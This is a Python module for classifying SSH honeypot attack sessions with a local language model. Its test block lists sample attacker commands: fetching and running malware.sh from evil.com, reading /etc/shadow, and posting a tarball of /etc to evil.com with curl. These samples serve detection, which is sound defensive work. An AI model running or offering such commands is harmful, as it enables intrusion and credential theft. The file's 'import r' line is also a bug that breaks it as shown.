import ollama
import json
import r

SYSTEM_PROMPT = """You are a cybersecurity AI expert analyzing SSH honeypot attack sessions.

You will receive a sequence of commands executed by an attacker inside a honeypot, and optionally additional session intelligence (login attempts, file transfers, SSH fingerprints, dwell time).

Your job is to deeply analyze the attacker's behavior:
- What is the attacker trying to accomplish?
- What techniques and tactics are they using?
- How sophisticated is this attack?
- What is the overall danger level?

Based on your expert analysis, respond with ONLY a valid JSON object using EXACTLY these field names:
- attack_type: a short, descriptive name for the attack (e.g., "Cryptominer Deployment", "IoT Botnet Recruitment", "Lateral Movement", etc.)
- threat_score: a float between 0.0 and 1.0 based on how dangerous you assess the session to be
- confidence: one of "low", "medium", "high"
- reasoning: a single sentence explaining your classification
- predicted_next: the most likely next command the attacker will type
- mitre_tactics: a list of strings representing MITRE ATT&CK Technique IDs (e.g., ["T1059.004", "T1082"])

NEVER use any field names other than the six listed above.
NEVER add any text outside the JSON object.
Classify based on your own cybersecurity expertise — analyze the full attack chain."""

def classify_with_llm(commands_list, session_intel=None):
    commands_str = "\n".join([f"{i+1}. {cmd}"
                              for i, cmd in enumerate(commands_list)])

    user_prompt = f"""Classify this SSH attack session:

{commands_str}
"""
    if session_intel:
        user_prompt += "\n" + session_intel.strip() + "\n"

    user_prompt += "\nRespond with JSON only."

    try:
        response = ollama.chat(
            model='llama3.2',
            messages=[
                {'role': 'system', 'content': SYSTEM_PROMPT},
                {'role': 'user', 'content': user_prompt}
            ]
        )

        text = response['message']['content'].strip()
        print(f"Raw LLM response:\n{text}\n")

        # Clean markdown if present
        text = re.sub(r'```json\s*', '', text)
        text = re.sub(r'```\s*', '', text)
        text = text.strip()

        # Find JSON object
        start = text.find('{')
        end = text.rfind('}')
        if start != -1 and end != -1:
            json_str = text[start:end+1]
            print(f"Attempting to parse: {json_str}")
            try:
                result = json.loads(json_str)
                print(f"Parsed successfully: {result}")
                return validate_result(result)
            except Exception as e:
                print(f"JSON parse error: {e}")

        return extract_from_text(text)

    except Exception as e:
        print(f"LLM error: {e}")
        return fallback_result()

def extract_from_text(text):
    result = {}

    type_match = re.search(r'"attack_type":\s*"([^"]+)"', text)
    if type_match:
        result["attack_type"] = type_match.group(1)

    score_match = re.search(r'"threat_score":\s*(\d+\.?\d*)', text)
    if score_match:
        score = float(score_match.group(1))
        if score > 1:
            score = score / 100
        result["threat_score"] = max(0.0, min(1.0, score))

    reasoning_match = re.search(r'"reasoning":\s*"([^"]+)"', text)
    if reasoning_match:
        result["reasoning"] = reasoning_match.group(1)

    predicted_match = re.search(r'"predicted_next":\s*"([^"]+)"', text)
    if predicted_match:
        result["predicted_next"] = predicted_match.group(1)

    confidence_match = re.search(r'"confidence":\s*"([^"]+)"', text)
    if confidence_match:
        result["confidence"] = confidence_match.group(1)

    mitre_match = re.search(r'"mitre_tactics":\s*\[(.*?)\]', text, re.DOTALL)
    if mitre_match:
        try:
            # Try to safely parse the array strings
            import ast
            arr_str = f"[{mitre_match.group(1)}]"
            result["mitre_tactics"] = ast.literal_eval(arr_str)
        except Exception:
            result["mitre_tactics"] = []

    if result.get("attack_type"):
        result.setdefault("threat_score", 0.5)
        result.setdefault("confidence", "medium")
        result.setdefault("reasoning", "Extracted from response")
        result.setdefault("predicted_next", "unknown")
        result.setdefault("mitre_tactics", [])
        return result

    return fallback_result()

def validate_result(result):
    if not result.get("attack_type") or not isinstance(result["attack_type"], str):
        result["attack_type"] = "Unknown Attack"

    score = float(result.get("threat_score", 0.1))
    result["threat_score"] = max(0.0, min(1.0, score))

    result.setdefault("confidence", "medium")
    result.setdefault("reasoning", "No reasoning provided")
    result.setdefault("predicted_next", "unknown")
    if not isinstance(result.get("mitre_tactics"), list):
        result["mitre_tactics"] = []

    return result

def fallback_result():
    return {
        "attack_type": "Unknown Attack",
        "threat_score": 0.1,
        "confidence": "low",
        "reasoning": "Classification failed",
        "predicted_next": "unknown",
        "mitre_tactics": []
    }

_score_cache = {}

def rule_based_score(command):
    """Use LLM to dynamically score a single command's threat level (0.0-1.0).
    Results are cached per unique command so the LLM is only called once."""
    cmd_key = command.strip().lower()
    if cmd_key in _score_cache:
        return _score_cache[cmd_key]

    prompt = (
        f'You are a cybersecurity expert analyzing commands captured in an SSH honeypot.\n'
        f'A command was just executed by an attacker who connected to our honeypot.\n\n'
        f'Command: {command}\n\n'
        f'Analyze this command deeply:\n'
        f'- What does this command actually do?\n'
        f'- What system resources or sensitive data does it access?\n'
        f'- What could an attacker achieve with this?\n'
        f'- How dangerous is this in a real attack scenario?\n\n'
        f'Based on your analysis, assign a threat score from 0.0 (completely harmless) '
        f'to 1.0 (critical threat / active exploitation).\n\n'
        f'Respond with ONLY: {{"score": <float>, "reason": "<your analysis in one sentence>"}}'
    )

    try:
        response = ollama.generate(
            model='llama3.2',
            prompt=prompt,
            options={'num_predict': 80, 'temperature': 0.1}
        )

        text = response['response'].strip()
        text = re.sub(r'```json\s*', '', text)
        text = re.sub(r'```\s*', '', text)
        text = text.strip()

        start = text.find('{')
        end = text.rfind('}')
        if start != -1 and end != -1:
            json_str = text[start:end+1]
            json_str = re.sub(r',\s*}', '}', json_str)
            json_str = re.sub(r'<[^>]+>', '""', json_str)
            try:
                result = json.loads(json_str)
                score = float(result.get('score', 0.15))
                score = max(0.0, min(1.0, score))
                _score_cache[cmd_key] = score
                return score
            except (json.JSONDecodeError, ValueError):
                pass

        match = re.search(r'(\d+\.?\d*)', text)
        if match:
            score = float(match.group(1))
            if score > 1:
                score = score / 100
            score = max(0.0, min(1.0, score))
            _score_cache[cmd_key] = score
            return score

    except Exception as e:
        print(f"LLM score error: {e}")

    _score_cache[cmd_key] = 0.15
    return 0.15

if __name__ == "__main__":
    print("TEST 1 - Ransomware Session:")
    print("="*50)
    result1 = classify_with_llm([
        "whoami",
        "uname -a",
        "wget http://evil.com/malware.sh",
        "chmod +x malware.sh",
        "./malware.sh"
    ])
    print(f"Attack Type: {result1['attack_type']}")
    print(f"Threat Score: {result1['threat_score']:.0%}")
    print(f"Confidence: {result1['confidence']}")
    print(f"Reasoning: {result1['reasoning']}")
    print(f"Predicted Next: {result1['predicted_next']}")

    print("\nTEST 2 - Reconnaissance Session:")
    print("="*50)
    result2 = classify_with_llm([
        "whoami",
        "uname -a",
        "hostname",
        "ifconfig",
        "ps aux"
    ])
    print(f"Attack Type: {result2['attack_type']}")
    print(f"Threat Score: {result2['threat_score']:.0%}")
    print(f"Confidence: {result2['confidence']}")
    print(f"Reasoning: {result2['reasoning']}")
    print(f"Predicted Next: {result2['predicted_next']}")

    print("\nTEST 3 - Data Exfiltration Session:")
    print("="*50)
    result3 = classify_with_llm([
        "whoami",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "tar -czf /tmp/data.tar.gz /etc",
        "curl http://evil.com --data @/tmp/data.tar.gz"
    ])
    print(f"Attack Type: {result3['attack_type']}")
    print(f"Threat Score: {result3['threat_score']:.0%}")
    print(f"Confidence: {result3['confidence']}")
    print(f"Reasoning: {result3['reasoning']}")
    print(f"Predicted Next: {result3['predicted_next']}")

    print("\nTEST 4 - Brute Force Session:")
    print("="*50)
    result4 = classify_with_llm([
        "failed password for root",
        "failed password for admin",
        "invalid user test",
        "failed password for root",
        "authentication failure"
    ])
    print(f"Attack Type: {result4['attack_type']}")
    print(f"Threat Score: {result4['threat_score']:.0%}")
    print(f"Confidence: {result4['confidence']}")
    print(f"Reasoning: {result4['reasoning']}")
    print(f"Predicted Next: {result4['predicted_next']}")
